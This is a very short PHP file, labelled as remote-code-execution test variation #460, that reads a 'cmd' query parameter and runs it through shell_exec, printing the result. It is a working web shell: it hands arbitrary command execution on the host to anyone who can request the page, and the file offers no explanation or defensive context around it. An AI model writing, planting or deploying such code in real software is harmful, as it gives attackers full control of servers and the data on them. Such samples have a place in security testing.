<?php
// RCE test variation #460
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>